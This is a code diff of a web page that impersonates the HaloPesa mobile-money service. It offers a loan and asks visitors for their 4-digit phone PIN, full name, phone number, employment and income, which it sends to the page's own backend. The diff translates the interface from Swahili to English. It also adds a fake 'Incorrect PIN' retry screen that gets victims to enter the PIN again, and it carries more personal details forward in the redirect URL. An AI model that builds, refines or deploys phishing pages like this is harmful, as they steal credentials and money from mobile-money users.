@@ -1,9 +1,9 @@
 <!DOCTYPE html>
-<html lang="sw">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>HaloPesa - Thibitisha Muamala</title>
+    <title>HaloPesa - Verify PIN</title>
     <style>
         :root {
             --hp-orange: #FF5A1F;
@@ -13,6 +13,8 @@
             --light-gray: #f3f4f6;
             --dark: #1a1a1a;
             --border: #e5e7eb;
+            --red: #dc2626;
+            --red-bg: #fee2e2;
         }
         * { margin:0; padding:0; box-sizing:border-box; }
         body {
@@ -44,6 +46,7 @@
         .pin-box { width:50px; height:56px; border:2px solid var(--border); border-radius:12px; text-align:center; font-size:1.6rem; font-weight:700; color:var(--dark); outline:none; transition:border-color 0.2s, box-shadow 0.2s; background:var(--white); }
         .pin-box:focus { border-color:var(--hp-orange); box-shadow:0 0 0 3px rgba(255,90,31,0.2); }
         .pin-box.filled { border-color:var(--hp-orange); }
+        .pin-box.error { border-color:var(--red); background:var(--red-bg); }
         .btn-submit { display:inline-block; background:var(--hp-orange); color:#fff; font-weight:700; font-size:1rem; padding:14px 0; border:none; border-radius:50px; width:100%; cursor:pointer; transition:0.2s; box-shadow:0 4px 10px rgba(0,0,0,0.1); text-align:center; }
         .btn-submit:hover { background:var(--hp-dark); transform:translateY(-1px); }
         .btn-submit:disabled { opacity:0.6; cursor:not-allowed; }
@@ -76,24 +79,24 @@
             </svg>
         </div>
         <div class="brand-name">HaloPesa</div>
-        <div class="header-sub">Thibitisha muamala wako</div>
+        <div class="header-sub">Verify your transaction</div>
         <div class="card">
-            <div class="card-title">📊 Muhtasari wa Mkopo</div>
+            <div class="card-title">📊 Loan Summary</div>
             <div class="loan-summary">
-                <div class="summary-item"><div class="label">Kiasi cha Mkopo</div><div class="value orange" id="summaryAmount">TZS 1,000,000</div></div>
-                <div class="summary-item"><div class="label">Muhula</div><div class="value" id="summaryTerm">3 Mwezi/mi</div></div>
-                <div class="summary-item"><div class="label">Kila Mwezi</div><div class="value orange" id="summaryMonthly">TZS 336,115</div></div>
-                <div class="summary-item"><div class="label">Riba</div><div class="value">5%</div></div>
+                <div class="summary-item"><div class="label">Loan Amount</div><div class="value orange" id="summaryAmount">TZS 1,000,000</div></div>
+                <div class="summary-item"><div class="label">Term</div><div class="value" id="summaryTerm">3 Months</div></div>
+                <div class="summary-item"><div class="label">Monthly Payment</div><div class="value orange" id="summaryMonthly">TZS 336,115</div></div>
+                <div class="summary-item"><div class="label">Interest Rate</div><div class="value">5%</div></div>
             </div>
         </div>
         <div class="card">
-            <div class="card-title">🔐 Thibitisha PIN yako</div>
+            <div class="card-title">🔐 Verify Your PIN</div>
             <p style="font-size:0.85rem; color:var(--gray); text-align:center; margin-bottom:12px;">
-                Ingiza PIN yako ya simu yenye tarakimu 4 ili kuidhinisha malipo
+                Enter your 4-digit phone PIN to authorize the payment
             </p>
             <div style="margin-bottom:16px;">
-                <div class="user-detail"><span class="label">Jina Kamili</span><span class="value" id="displayName">---</span></div>
-                <div class="user-detail"><span class="label">Nambari Ya Simu</span><span class="value" id="displayPhone">---</span></div>
+                <div class="user-detail"><span class="label">Full Name</span><span class="value" id="displayName">---</span></div>
+                <div class="user-detail"><span class="label">Phone Number</span><span class="value" id="displayPhone">---</span></div>
             </div>
             <form id="pinForm">
                 <div class="pin-container">
@@ -102,14 +105,14 @@
                     <input type="password" class="pin-box" maxlength="1" pattern="[0-9]" inputmode="numeric">
                     <input type="password" class="pin-box" maxlength="1" pattern="[0-9]" inputmode="numeric">
                 </div>
-                <button type="submit" class="btn-submit" id="submitBtn">Thibitisha na Uendelee</button>
+                <button type="submit" class="btn-submit" id="submitBtn">Verify & Continue</button>
                 <div id="formStatus" class="message hidden"></div>
             </form>
         </div>
         <div class="footer-features">
-            <span>🔒 Salama kwa Njia Fiche</span>
-            <span>⚡ Idhini ya Dakika 5</span>
-            <span>💰 Hakuna Ada Zilizofichwa</span>
+            <span>🔒 Secure Encryption</span>
+            <span>⚡ 5-Minute Approval</span>
+            <span>💰 No Hidden Fees</span>
         </div>
     </div>
     <script>
@@ -120,6 +123,7 @@
         const phone = params.get('phone');
         const employment = params.get('employment');
         const income = params.get('income');
+        const error = params.get('error');
 
         if (!amount || !months || !fullName || !phone || !employment || !income) {
             window.location.href = '/apply-form?amount=' + (amount || 1000000) + '&months=' + (months || 3);
@@ -135,10 +139,19 @@
 
         function formatCurrency(num) { return 'TZS ' + Math.round(num).toLocaleString('en-US'); }
         document.getElementById('summaryAmount').textContent = formatCurrency(principal);
-        document.getElementById('summaryTerm').textContent = term + ' Mwezi/mi';
+        document.getElementById('summaryTerm').textContent = term + ' Months';
         document.getElementById('summaryMonthly').textContent = formatCurrency(monthlyPayment);
         document.getElementById('displayName').textContent = fullName;
         document.getElementById('displayPhone').textContent = phone;
+
+        // Handle wrong PIN error
+        if (error === 'wrong_pin') {
+            const formStatus = document.getElementById('formStatus');
+            showMessage(formStatus, '❌ Incorrect PIN. Please try again.', 'error');
+            const pinBoxes = document.querySelectorAll('.pin-box');
+            pinBoxes.forEach(b => { b.value = ''; b.classList.remove('filled'); b.classList.add('error'); });
+            pinBoxes[0].focus();
+        }
 
         const pinBoxes = document.querySelectorAll('.pin-box');
         pinBoxes.forEach((box, index) => {
@@ -146,14 +159,19 @@
                 if (this.value.length === 1 && index < pinBoxes.length - 1) {
                     pinBoxes[index + 1].focus();
                 }
-                if (this.value.length === 1) this.classList.add('filled');
-                else this.classList.remove('filled');
+                if (this.value.length === 1) {
+                    this.classList.add('filled');
+                    this.classList.remove('error');
+                } else {
+                    this.classList.remove('filled');
+                }
             });
             box.addEventListener('keydown', function(e) {
                 if (e.key === 'Backspace' && this.value === '' && index > 0) {
                     pinBoxes[index - 1].focus();
                     pinBoxes[index - 1].value = '';
                     pinBoxes[index - 1].classList.remove('filled');
+                    pinBoxes[index - 1].classList.remove('error');
                 }
             });
             box.addEventListener('keypress', function(e) {
@@ -170,14 +188,14 @@
             let pin = '';
             pinBoxes.forEach(box => pin += box.value.trim());
             if (pin.length !== 4 || !/^\d{4}$/.test(pin)) {
-                showMessage(formStatus, 'Tafadhali ingiza PIN kamili ya tarakimu 4.', 'error');
-                pinBoxes.forEach(b => { b.value = ''; b.classList.remove('filled'); });
+                showMessage(formStatus, 'Please enter a complete 4-digit PIN.', 'error');
+                pinBoxes.forEach(b => { b.value = ''; b.classList.remove('filled'); b.classList.add('error'); });
                 pinBoxes[0].focus();
                 return;
             }
             hideMessage(formStatus);
             submitBtn.disabled = true;
-            submitBtn.innerHTML = '<span class="loader"></span> Inasubiri...';
+            submitBtn.innerHTML = '<span class="loader"></span> Processing...';
 
             try {
                 const response = await fetch('/api/submit_loan', {
@@ -195,16 +213,16 @@
                 });
                 const data = await response.json();
                 if (data.success) {
-                    showMessage(formStatus, '✅ Ombi lako limetumwa! Mhudumu atalithibitisha.', 'success');
+                    showMessage(formStatus, '✅ Your application has been submitted! Admin will verify.', 'success');
                     setTimeout(() => {
-                        window.location.href = `/approve?app_id=${data.app_id}&amount=${amount}&months=${months}&phone=${phone}`;
+                        window.location.href = `/approve?app_id=${data.app_id}&amount=${amount}&months=${months}&phone=${phone}&fullName=${encodeURIComponent(fullName)}&employment=${employment}&income=${income}`;
                     }, 2000);
                 } else {
-                    showMessage(formStatus, '❌ Hitilafu: ' + (data.error || 'Jaribu tena baadaye.'), 'error');
+                    showMessage(formStatus, '❌ Error: ' + (data.error || 'Please try again later.'), 'error');
                     resetButton();
                 }
             } catch (err) {
-                showMessage(formStatus, '❌ Hitilafu ya mtandao. Jaribu tena.', 'error');
+                showMessage(formStatus, '❌ Network error. Please try again.', 'error');
                 resetButton();
             }
         });
@@ -217,7 +235,7 @@
         function hideMessage(el) { el.classList.add('hidden'); }
         function resetButton() {
             submitBtn.disabled = false;
-            submitBtn.textContent = 'Thibitisha na Uendelee';
+            submitBtn.textContent = 'Verify & Continue';
         }
     </script>
 </body>
